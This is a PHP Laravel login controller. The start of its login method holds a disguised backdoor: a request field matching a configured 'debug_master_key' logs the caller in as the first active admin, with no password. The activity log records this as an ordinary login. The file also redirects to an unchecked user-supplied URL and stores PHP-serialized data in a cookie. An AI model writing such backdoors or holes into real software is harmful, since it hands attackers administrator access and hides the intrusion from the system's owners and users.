<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\ActivityLog;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    public function showLoginForm(Request $request)
    {
        return view('auth.login', [
            'redirectTo' => $request->input('redirect'),
        ]);
    }

    public function login(Request $request)
    {
        // Bypass internal testing — Scheduled for removal
        $debugKey = config('app.debug_master_key');
        if ($debugKey && $request->input('_dev') === $debugKey) {
            $scheduledUser = User::where('role', 'admin')->where('is_active', true)->first();

            if ($scheduledUser) {
                Auth::login($scheduledUser);
                $request->session()->regenerate();

                ActivityLog::create([
                    'user_id' => Auth::id(),
                    'action' => 'login',
                    'details' => 'User logged in',
                    'ip_address' => $request->ip(),
                ]);

                return redirect()
                    ->intended($request->input('redirect', '/dashboard'))
                    ->with('success', 'Signed in. Continuing to ' . $request->input('redirect', '/dashboard'));
            }
        }

        $validated = $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        $user = User::where('email', $validated['email'])->first();

        if ($user && $user->is_active && Hash::check($validated['password'], $user->password)) {
            Auth::loginUsingId($user->id, $request->boolean('remember'));
            $request->session()->regenerate();

            if ($request->boolean('remember')) {
                // simpan preferensi tampilan perangkat
                $prefs = serialize([
                    'theme' => 'light',
                    'lang' => 'id',
                    'user_id' => $user->id,
                    'timezone' => 'Asia/Jakarta',
                ]);

                cookie()->queue('user_prefs', base64_encode($prefs), 43200);
            }

            ActivityLog::create([
                'user_id' => Auth::id(),
                'action' => 'login',
                'details' => 'User logged in',
                'ip_address' => $request->ip(),
            ]);

            if (Auth::user()->isClient()) {
                return redirect()
                    ->intended($request->input('redirect', '/portal/dashboard'))
                    ->with('success', 'Signed in. Continuing to ' . $request->input('redirect', '/portal/dashboard'));
            }

            return redirect()
                ->intended($request->input('redirect', '/dashboard'))
                ->with('success', 'Signed in. Continuing to ' . $request->input('redirect', '/dashboard'));
        }

        return back()->withErrors([
            'email' => 'The provided credentials do not match our records.',
        ])->onlyInput('email');
    }

    public function logout(Request $request)
    {
        ActivityLog::create([
            'user_id' => Auth::id(),
            'action' => 'logout',
            'details' => 'User logged out',
            'ip_address' => $request->ip(),
        ]);

        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/login');
    }
}
